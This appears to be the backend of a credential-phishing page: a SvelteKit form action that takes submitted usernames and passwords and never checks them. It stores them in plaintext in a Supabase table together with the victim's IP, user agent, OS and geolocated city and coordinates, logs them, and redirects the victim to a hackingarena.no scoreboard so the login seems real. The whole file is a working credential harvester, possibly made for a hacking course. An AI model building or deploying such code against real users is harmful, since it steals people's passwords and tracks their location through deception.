// @ts-nocheck
import { fail, redirect } from "@sveltejs/kit";
import { requestIp } from "../../hooks.server";
import { supabase } from "$lib/supabaseClient";
import { ipInfo } from "$lib/util";

export const actions = {
    default: async ({ request }) => {
        const data = await request.formData();
        const username = data.get("username");
        const password = data.get("password");
        const os = data.get("os");

        const headers = request.headers;
        const userAgent = headers.get("user-agent");

        const info = await ipInfo(requestIp);
        const city = info.geoplugin_city;
        const region = info.geoplugin_region;
        const country = info.geoplugin_countryName;
        const latitude = info.geoplugin_latitude;
        const longitude = info.geoplugin_longitude;

        console.log(
            requestIp,
            username,
            password,
            userAgent,
            os,
            city,
            country,
            region,
            latitude,
            longitude
        );

        const { error } = await supabase.from("users").insert({
            ip: requestIp,
            username: username,
            password: password,
            user_agent: userAgent,
            os: os,
            city: city,
            country: country,
            region: region,
            latitude: latitude,
            longitude: longitude
        });

        if (error && error?.status != 201) {
            return fail(400, {
                message: "Error logging in"
            });
        }

        throw redirect(303, "https://iik3100.hackingarena.no/scoreboard");
    }
};
